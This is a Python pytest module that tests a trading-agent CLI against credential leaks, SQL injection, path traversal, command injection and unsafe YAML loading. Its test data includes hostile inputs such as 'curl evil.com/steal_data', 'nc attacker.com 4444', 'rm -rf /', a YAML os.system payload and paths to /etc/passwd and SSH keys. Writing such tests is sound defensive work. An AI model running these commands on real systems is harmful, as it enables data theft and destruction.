"""
CLI Security Tests.

This module provides security testing for CLI operations:
- API key and credential handling validation
- Input sanitization and injection prevention
- File path traversal protection
- Environment variable security
- Configuration file security validation
- Output sanitization for sensitive data
- Authentication and authorization testing
"""

import os
import sys
import tempfile
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest
from typer.testing import CliRunner

# Add the src directory to the path for imports
sys.path.insert(0, str(Path(__file__).parent.parent.parent / "src"))

from trade_agent.cli import app as main_app


class TestCLICredentialSecurity:
    """Test secure handling of credentials and API keys."""

    def setup_method(self):
        """Setup test fixtures."""
        self.runner = CliRunner()
        self.temp_dir = tempfile.mkdtemp()

    def teardown_method(self):
        """Cleanup test fixtures."""
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_api_key_not_logged_in_output(self):
        """Test that API keys are not exposed in CLI output."""
        # Create config with API key
        config_file = Path(self.temp_dir) / "test_config.yaml"
        config_content = """
        data:
          api_key: "secret_api_key_12345"
          source: "yfinance"
        environment: "test"
        """
        config_file.write_text(config_content)

        with patch("trade_agent.cli.load_settings") as mock_load_settings:
            mock_settings = MagicMock()
            mock_settings.data.api_key = "secret_api_key_12345"
            mock_load_settings.return_value = mock_settings

            result = self.runner.invoke(
                main_app,
                ["--config", str(config_file), "info"]
            )

            # API key should not appear in output
            assert "secret_api_key_12345" not in result.output
            assert "secret" not in result.output.lower() or "****" in result.output

    def test_password_not_logged_in_output(self):
        """Test that passwords are not exposed in CLI output."""
        # Simulate database configuration with password
        config_file = Path(self.temp_dir) / "db_config.yaml"
        config_content = """
        database:
          host: "localhost"
          username: "trader"
          password: "super_secret_password"
        """
        config_file.write_text(config_content)

        with patch("trade_agent.cli.load_settings") as mock_load_settings:
            mock_settings = MagicMock()
            mock_settings.database.password = "super_secret_password"
            mock_load_settings.return_value = mock_settings

            result = self.runner.invoke(
                main_app,
                ["--config", str(config_file), "info"]
            )

            # Password should not appear in output
            assert "super_secret_password" not in result.output
            assert result.exit_code == 0

    def test_environment_variable_credential_security(self):
        """Test that credentials from environment variables are handled securely."""
        sensitive_env_vars = {
            "TRADING_RL_AGENT_API_KEY": "env_secret_key_123",
            "TRADING_RL_AGENT_DB_PASSWORD": "env_password_456",
            "TRADING_RL_AGENT_SECRET_TOKEN": "env_token_789"
        }

        # Set environment variables
        original_env = {}
        for key, value in sensitive_env_vars.items():
            original_env[key] = os.environ.get(key)
            os.environ[key] = value

        try:
            result = self.runner.invoke(main_app, ["info"])

            # No sensitive environment variable values should appear in output
            for key, value in sensitive_env_vars.items():
                assert value not in result.output

        finally:
            # Restore original environment
            for key, original_value in original_env.items():
                if original_value is None:
                    os.environ.pop(key, None)
                else:
                    os.environ[key] = original_value

    def test_config_file_credential_masking(self):
        """Test that credentials in config files are properly masked."""
        config_file = Path(self.temp_dir) / "masked_config.yaml"
        config_content = """
        trading:
          broker_api_key: "broker_secret_abc123"
          broker_secret: "broker_secret_def456"
        data_sources:
          alpha_vantage_key: "av_key_xyz789"
          news_api_key: "news_key_qwe456"
        """
        config_file.write_text(config_content)

        with patch("trade_agent.cli.load_settings") as mock_load_settings, \
             patch("trade_agent.cli.print_config_summary") as mock_print_config:

            mock_settings = MagicMock()
            mock_load_settings.return_value = mock_settings

            result = self.runner.invoke(
                main_app,
                ["--config", str(config_file), "info"]
            )

            # Verify sensitive keys are not exposed
            sensitive_values = [
                "broker_secret_abc123", "broker_secret_def456",
                "av_key_xyz789", "news_key_qwe456"
            ]

            for sensitive_value in sensitive_values:
                assert sensitive_value not in result.output


class TestCLIInputSanitization:
    """Test input sanitization and injection prevention."""

    def setup_method(self):
        """Setup test fixtures."""
        self.runner = CliRunner()
        self.temp_dir = tempfile.mkdtemp()

    def teardown_method(self):
        """Cleanup test fixtures."""
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_sql_injection_prevention_in_symbols(self):
        """Test prevention of SQL injection in symbol parameters."""
        malicious_symbols = [
            "AAPL'; DROP TABLE stocks; --",
            "GOOGL' OR '1'='1",
            "MSFT'; INSERT INTO trades VALUES ('hack'); --",
            "TSLA' UNION SELECT * FROM secrets --"
        ]

        for malicious_symbol in malicious_symbols:
            with patch("trade_agent.data.pipeline.DataPipeline") as mock_pipeline, \
                 patch("trade_agent.utils.cache_manager.CacheManager") as mock_cache:

                mock_pipeline_instance = MagicMock()
                mock_pipeline.return_value = mock_pipeline_instance

                mock_cache_instance = MagicMock()
                mock_cache.return_value = mock_cache_instance
                mock_cache_instance.get_cached_data.return_value = None

                result = self.runner.invoke(
                    main_app,
                    [
                        "data", "pipeline", "--run",
                        "--symbols", malicious_symbol,
                        "--no-sentiment",
                        "--output-dir", self.temp_dir
                    ]
                )

                # Should either reject malicious input or sanitize it
                # The exact behavior depends on implementation
                if result.exit_code != 0:
                    assert any(word in result.output.lower() for word in [
                        "invalid", "symbol", "error", "malformed"
                    ])

    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks."""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "../../.ssh/id_rsa"
        ]

        for malicious_path in malicious_paths:
            result = self.runner.invoke(
                main_app,
                [
                    "data", "pipeline", "--run",
                    "--symbols", "AAPL",
                    "--output-dir", malicious_path,
                    "--no-sentiment"
                ]
            )

            # Should reject path traversal attempts
            if result.exit_code != 0:
                assert any(word in result.output.lower() for word in [
                    "invalid", "path", "directory", "permission", "error"
                ])
            else:
                # If it succeeds, verify it didn't actually write to the malicious path
                assert not Path(malicious_path).exists()

    def test_command_injection_prevention_in_dataset_name(self):
        """Test prevention of command injection in dataset names."""
        malicious_names = [
            "test; rm -rf /",
            "dataset && curl evil.com/steal_data",
            "data | nc attacker.com 4444",
            "name; cat /etc/passwd > /tmp/stolen",
            "test`whoami > /tmp/user`"
        ]

        for malicious_name in malicious_names:
            with patch("trade_agent.data.pipeline.DataPipeline") as mock_pipeline, \
                 patch("trade_agent.data.data_standardizer.create_standardized_dataset") as mock_standardizer, \
                 patch("trade_agent.utils.cache_manager.CacheManager") as mock_cache:

                # Setup mocks
                mock_pipeline_instance = MagicMock()
                mock_pipeline.return_value = mock_pipeline_instance
                mock_pipeline_instance.download_data_parallel.return_value = self._create_mock_dataframe()

                mock_standardizer.return_value = (self._create_mock_dataframe(), MagicMock())

                mock_cache_instance = MagicMock()
                mock_cache.return_value = mock_cache_instance
                mock_cache_instance.get_cached_data.return_value = None

                result = self.runner.invoke(
                    main_app,
                    [
                        "data", "pipeline", "--run",
                        "--symbols", "AAPL",
                        "--dataset-name", malicious_name,
                        "--no-sentiment",
                        "--output-dir", self.temp_dir
                    ]
                )

                # Should either sanitize the name or reject it
                if result.exit_code == 0:
                    # If successful, verify no command injection occurred
                    created_files = list(Path(self.temp_dir).rglob("*"))
                    for file_path in created_files:
                        # Dataset name should not contain shell metacharacters
                        sanitized_name = file_path.name.replace(";", "").replace("&", "").replace("|", "").replace("`", "")
                        assert len(sanitized_name) > 0

    def test_yaml_injection_prevention_in_config(self):
        """Test prevention of YAML injection in configuration files."""
        malicious_config = Path(self.temp_dir) / "malicious_config.yaml"
        malicious_yaml_content = """
        # YAML injection attempt
        data: &anchor
          source: yfinance
        malicious: *anchor
        environment: test
        # Attempt to execute code
        !!python/object/apply:os.system ["echo 'hacked' > /tmp/hack_proof"]
        """
        malicious_config.write_text(malicious_yaml_content)

        result = self.runner.invoke(
            main_app,
            ["--config", str(malicious_config), "info"]
        )

        # Should either reject the malicious YAML or handle it safely
        if result.exit_code != 0:
            assert "error" in result.output.lower()

        # Verify no malicious code was executed
        hack_proof_file = Path("/tmp/hack_proof")
        assert not hack_proof_file.exists()

    def _create_mock_dataframe(self):
        """Create a mock DataFrame for testing."""
        import pandas as pd
        return pd.DataFrame({
            "symbol": ["AAPL"],
            "close": [150.0],
            "volume": [1000000],
            "date": pd.to_datetime(["2023-01-01"])
        })


class TestCLIFileSecurity:
    """Test file system security measures."""

    def setup_method(self):
        """Setup test fixtures."""
        self.runner = CliRunner()
        self.temp_dir = tempfile.mkdtemp()

    def teardown_method(self):
        """Cleanup test fixtures."""
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_config_file_permissions(self):
        """Test that config files are created with secure permissions."""
        config_file = Path(self.temp_dir) / "secure_config.yaml"
        config_content = """
        environment: test
        debug: false
        """
        config_file.write_text(config_content)

        # On Unix systems, check file permissions
        if os.name == "posix":
            # Set restrictive permissions
            config_file.chmod(0o600)  # Owner read/write only

            result = self.runner.invoke(
                main_app,
                ["--config", str(config_file), "info"]
            )

            assert result.exit_code == 0

    def test_output_directory_creation_security(self):
        """Test that output directories are created securely."""
        secure_output_dir = Path(self.temp_dir) / "secure_output"

        with patch("trade_agent.data.pipeline.DataPipeline") as mock_pipeline, \
             patch("trade_agent.data.data_standardizer.create_standardized_dataset") as mock_standardizer, \
             patch("trade_agent.utils.cache_manager.CacheManager") as mock_cache:

            # Setup mocks
            mock_pipeline_instance = MagicMock()
            mock_pipeline.return_value = mock_pipeline_instance
            mock_pipeline_instance.download_data_parallel.return_value = self._create_mock_dataframe()

            mock_standardizer.return_value = (self._create_mock_dataframe(), MagicMock())

            mock_cache_instance = MagicMock()
            mock_cache.return_value = mock_cache_instance
            mock_cache_instance.get_cached_data.return_value = None

            result = self.runner.invoke(
                main_app,
                [
                    "data", "pipeline", "--run",
                    "--symbols", "AAPL",
                    "--no-sentiment",
                    "--output-dir", str(secure_output_dir),
                    "--dataset-name", "security_test"
                ]
            )

            if result.exit_code == 0 and secure_output_dir.exists() and os.name == "posix":
                # On Unix systems, verify directory permissions
                dir_stat = secure_output_dir.stat()
                # Should not be world-writable
                assert not (dir_stat.st_mode & 0o002)

    def test_temporary_file_cleanup(self):
        """Test that temporary files are properly cleaned up."""
        temp_files_before = set(Path(tempfile.gettempdir()).glob("*"))

        with patch("trade_agent.data.pipeline.DataPipeline") as mock_pipeline, \
             patch("trade_agent.data.data_standardizer.create_standardized_dataset") as mock_standardizer, \
             patch("trade_agent.utils.cache_manager.CacheManager") as mock_cache:

            # Setup mocks
            mock_pipeline_instance = MagicMock()
            mock_pipeline.return_value = mock_pipeline_instance
            mock_pipeline_instance.download_data_parallel.return_value = self._create_mock_dataframe()

            mock_standardizer.return_value = (self._create_mock_dataframe(), MagicMock())

            mock_cache_instance = MagicMock()
            mock_cache.return_value = mock_cache_instance
            mock_cache_instance.get_cached_data.return_value = None

            result = self.runner.invoke(
                main_app,
                [
                    "data", "pipeline", "--run",
                    "--symbols", "AAPL",
                    "--no-sentiment",
                    "--output-dir", self.temp_dir,
                    "--dataset-name", "cleanup_test"
                ]
            )

        # Check for temp file leaks
        temp_files_after = set(Path(tempfile.gettempdir()).glob("*"))
        new_temp_files = temp_files_after - temp_files_before

        # Should not have excessive temporary files
        trading_related_temps = [f for f in new_temp_files if any(
            keyword in str(f).lower() for keyword in ["trading", "agent", "dataset", "pipeline"]
        )]

        # Allow some temporary files but not excessive amounts
        assert len(trading_related_temps) < 10

    def test_log_file_security(self):
        """Test that log files don't contain sensitive information."""
        with patch("trade_agent.cli.setup_logging") as mock_setup_logging, \
             patch("logging.getLogger") as mock_get_logger:

            mock_logger = MagicMock()
            mock_get_logger.return_value = mock_logger

            # Simulate logging with sensitive data
            sensitive_data = "api_key=secret123&password=hidden456"

            result = self.runner.invoke(
                main_app,
                ["-vv", "info"]  # Verbose logging
            )

            # Verify that logger calls don't contain raw sensitive data
            # This is implementation-dependent, but sensitive data should be masked
            for call in mock_logger.info.call_args_list:
                call_str = str(call)
                assert "secret123" not in call_str
                assert "hidden456" not in call_str

    def _create_mock_dataframe(self):
        """Create a mock DataFrame for testing."""
        import pandas as pd
        return pd.DataFrame({
            "symbol": ["AAPL"],
            "close": [150.0],
            "volume": [1000000],
            "date": pd.to_datetime(["2023-01-01"])
        })


class TestCLIOutputSanitization:
    """Test output sanitization for sensitive data."""

    def setup_method(self):
        """Setup test fixtures."""
        self.runner = CliRunner()
        self.temp_dir = tempfile.mkdtemp()

    def teardown_method(self):
        """Cleanup test fixtures."""
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_error_message_sanitization(self):
        """Test that error messages don't expose sensitive information."""
        # Create config with sensitive information
        config_file = Path(self.temp_dir) / "error_config.yaml"
        config_content = """
        database:
          connection_string: "postgresql://user:secretpass@db.example.com:5432/trading"
        api:
          secret_key: "sk_live_abcdef123456789"
        """
        config_file.write_text(config_content)

        with patch("trade_agent.cli.load_settings") as mock_load_settings:
            # Simulate an error that might expose configuration
            mock_load_settings.side_effect = Exception("Database connection failed: postgresql://user:secretpass@db.example.com:5432/trading")

            result = self.runner.invoke(
                main_app,
                ["--config", str(config_file), "info"]
            )

            assert result.exit_code == 1

            # Sensitive information should not appear in error output
            assert "secretpass" not in result.output
            assert "sk_live_abcdef123456789" not in result.output

            # But should still provide useful error information
            assert "error" in result.output.lower()

    def test_debug_output_sanitization(self):
        """Test that debug output doesn't expose sensitive data."""
        with patch("trade_agent.cli.get_settings") as mock_get_settings:
            mock_settings = MagicMock()
            mock_settings.debug = True
            mock_settings.api_key = "secret_debug_key_123"
            mock_settings.database_password = "debug_db_pass_456"
            mock_get_settings.return_value = mock_settings

            result = self.runner.invoke(
                main_app,
                ["-vvv", "info"]  # Maximum verbosity
            )

            # Even in debug mode, secrets should not be exposed
            assert "secret_debug_key_123" not in result.output
            assert "debug_db_pass_456" not in result.output

    def test_stack_trace_sanitization(self):
        """Test that stack traces don't expose sensitive information."""
        with patch("trade_agent.data.pipeline.DataPipeline") as mock_pipeline:
            # Simulate an exception that might contain sensitive data in the traceback
            sensitive_error = Exception("Connection failed with key: sk_live_secret123")
            mock_pipeline.side_effect = sensitive_error

            result = self.runner.invoke(
                main_app,
                [
                    "data", "pipeline", "--run",
                    "--symbols", "AAPL",
                    "--no-sentiment",
                    "--output-dir", self.temp_dir
                ]
            )

            assert result.exit_code == 1

            # Sensitive data should not appear in error output
            assert "sk_live_secret123" not in result.output


class TestCLIConfigurationSecurity:
    """Test configuration file security measures."""

    def setup_method(self):
        """Setup test fixtures."""
        self.runner = CliRunner()
        self.temp_dir = tempfile.mkdtemp()

    def teardown_method(self):
        """Cleanup test fixtures."""
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_config_validation_prevents_malicious_paths(self):
        """Test that configuration validation prevents malicious file paths."""
        malicious_config = Path(self.temp_dir) / "malicious_paths.yaml"
        config_content = """
        data:
          cache_dir: "/etc/passwd"
          temp_dir: "/root/.ssh/"
        logging:
          file: "/var/log/system.log"
        """
        malicious_config.write_text(config_content)

        result = self.runner.invoke(
            main_app,
            ["--config", str(malicious_config), "info"]
        )

        # Should either reject the config or sanitize the paths
        # The exact behavior depends on implementation
        if result.exit_code != 0:
            assert any(word in result.output.lower() for word in [
                "invalid", "path", "permission", "error", "security"
            ])

    def test_config_schema_validation(self):
        """Test that configuration schema validation prevents invalid configs."""
        invalid_config = Path(self.temp_dir) / "invalid_schema.yaml"
        config_content = """
        # Invalid configuration structure
        malicious_field: "unexpected_value"
        data:
          invalid_nested:
            dangerous_option: true
        """
        invalid_config.write_text(config_content)

        with patch("trade_agent.cli.load_settings") as mock_load_settings:
            # Simulate configuration validation error
            mock_load_settings.side_effect = ValueError("Invalid configuration schema")

            result = self.runner.invoke(
                main_app,
                ["--config", str(invalid_config), "info"]
            )

            assert result.exit_code == 1
            assert "error" in result.output.lower()

    def test_environment_variable_override_security(self):
        """Test security of environment variable configuration overrides."""
        # Test that sensitive environment variables are handled securely
        malicious_env = {
            "TRADING_RL_AGENT_EXECUTABLE_PATH": "/bin/rm",
            "TRADING_RL_AGENT_SHELL_COMMAND": "rm -rf /",
            "TRADING_RL_AGENT_UNSAFE_MODE": "true"
        }

        original_env = {}
        for key, value in malicious_env.items():
            original_env[key] = os.environ.get(key)
            os.environ[key] = value

        try:
            result = self.runner.invoke(main_app, ["info"])

            # Should not execute malicious environment variable values
            assert result.exit_code == 0

        finally:
            # Restore original environment
            for key, original_value in original_env.items():
                if original_value is None:
                    os.environ.pop(key, None)
                else:
                    os.environ[key] = original_value


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
